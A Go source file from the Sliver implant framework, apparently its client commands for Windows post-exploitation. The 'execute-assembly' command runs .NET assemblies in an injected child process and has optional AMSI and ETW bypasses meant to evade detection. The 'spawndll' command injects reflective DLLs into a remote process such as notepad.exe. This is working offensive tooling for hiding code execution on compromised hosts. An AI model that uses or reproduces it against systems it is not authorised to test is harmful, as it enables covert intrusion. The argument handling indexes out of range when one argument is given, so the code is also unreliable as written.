package windows

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"

	"github.com/bishopfox/sliver/client/constants"
	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ExecuteAssembly - Loads and executes a .NET assembly in a child process (Windows Only)
type ExecuteAssembly struct {
	Positional struct {
		Path string   `description:"path to assembly bytes" required:"1-1"`
		Args []string `description:"(optional) arguments to pass to assembly when executing"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		AMSI       bool   `long:"amsi" short:"a" description:"use AMSI bypass (disabled by default)"`
		ETW        bool   `long:"etw" short:"e" description:"patch EtwEventWrite function to avoid detection (disabled by default)"`
		RemotePath string `long:"process" short:"p" description:"hosting process to inject into" default:"c:\\windows\\system32\\notepad.exe"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
	} `group:"assembly options"`
}

// Execute - Loads and executes a .NET assembly in a child process (Windows Only)
func (ea *ExecuteAssembly) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	assemblyBytes, err := ioutil.ReadFile(ea.Positional.Path)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ea.Positional.Args) == 1 {
		assemblyArgs = ea.Positional.Args[1]
	} else if len(ea.Positional.Args) < 2 {
		assemblyArgs = " "
	}
	process := ea.Options.RemotePath

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	executeAssembly, err := transport.RPC.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		AmsiBypass: ea.Options.AMSI,
		Process:    process,
		Arguments:  assemblyArgs,
		Assembly:   assemblyBytes,
		EtwBypass:  ea.Options.ETW,
		Request:    cctx.Request(session),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	if executeAssembly.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", executeAssembly.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ea.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.ExecuteAssemblyStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Assembly output:\n%s", string(executeAssembly.GetOutput()))
	if outFilePath != nil {
		outFilePath.Write(executeAssembly.GetOutput())
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}
	return
}

// SpawnDLL - Load and execute a Reflective DLL in a remote process
type SpawnDLL struct {
	Positional struct {
		Path string   `description:"path to reflective DLL" required:"1-1"`
		Args []string `description:"(optional) arguments to be passed when executing the DLL"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Export     string `long:"export" short:"e" description:"entrypoint of the reflective DLL" default:"ReflectiveLoader"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the DLL" default:"c:\\windows\\system32\\notepad.exe"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
	} `group:"dll options"`
}

// Execute - Load and execute a Reflective DLL in a remote process
func (s *SpawnDLL) Execute(cargs []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	var args = strings.Join(s.Positional.Args, " ")

	binPath := s.Positional.Path
	processName := s.Options.RemotePath
	exportName := s.Options.Export

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
	spawndll, err := transport.RPC.SpawnDll(context.Background(), &sliverpb.InvokeSpawnDllReq{
		Data:        binData,
		ProcessName: processName,
		Args:        args,
		EntryPoint:  exportName,
		Request:     cctx.Request(session),
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}
	ctrl <- true
	<-ctrl
	if spawndll.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", spawndll.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SpawnDllStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Output:\n%s", spawndll.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(spawndll.GetResult()))
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}

	return
}
